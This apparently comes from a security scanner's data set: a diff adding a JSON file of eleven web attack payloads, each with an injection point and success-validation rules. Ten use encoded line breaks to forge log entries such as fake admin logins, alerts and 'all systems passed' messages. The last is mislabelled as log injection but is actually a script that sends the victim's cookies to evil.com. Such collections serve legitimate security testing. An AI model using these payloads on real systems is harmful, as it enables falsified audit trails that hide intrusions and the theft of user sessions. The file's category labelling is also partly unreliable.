@@ -1,0 +1,123 @@
+[
+  {
+    "payload_id": "OWP-74742",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "test%0d%0a%0d%0aADMIN LOGIN SUCCESSFUL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74743",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "test%0a%0aADMIN LOGIN SUCCESSFUL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74744",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a[INFO] User admin authenticated",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74745",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0a[INFO] User admin authenticated",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74746",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a[ALERT] System compromised",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74747",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0a[ALERT] System compromised",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74748",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a[ERROR] Database connection failed",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74749",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0a[ERROR] Database connection failed",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74750",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0aCRITICAL: All systems passed security check",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74751",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0aCRITICAL: All systems passed security check",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  },
+  {
+    "payload_id": "OWP-74752",
+    "vulnerability_category": "Security Logging & Monitoring Failures (Log Injection)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<script>new Image().src=\"http://evil.com/steal?\"+document.cookie</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ALERT|CRITICAL|ADMIN"
+    }
+  }
+]
